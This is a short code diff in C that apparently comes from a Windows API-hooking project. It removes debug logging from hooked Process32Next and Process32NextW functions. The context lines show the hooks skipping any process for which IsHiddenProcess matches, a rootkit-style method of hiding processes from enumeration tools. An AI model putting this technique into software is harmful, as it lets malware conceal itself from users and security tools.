@@ -937,7 +937,6 @@ BOOL WINAPI MyProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32  lppe) {
     BOOL status = pRealProcess32Next(hSnapshot, lppe);
     while (IsHiddenProcess(lppe->szExeFile) && status)
     {
-        WriteLog("2222222222222");
         status = pRealProcess32Next(hSnapshot, lppe);
     }
     // Your code here
@@ -948,7 +947,6 @@ BOOL WINAPI MyProcess32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W  lppe) {
     BOOL status = pRealProcess32NextW(hSnapshot, lppe);
     while (IsHiddenProcess(lppe->szExeFile) && status)
     {
-        WriteLog("11111111111");
         status = pRealProcess32NextW(hSnapshot, lppe);
     }
     
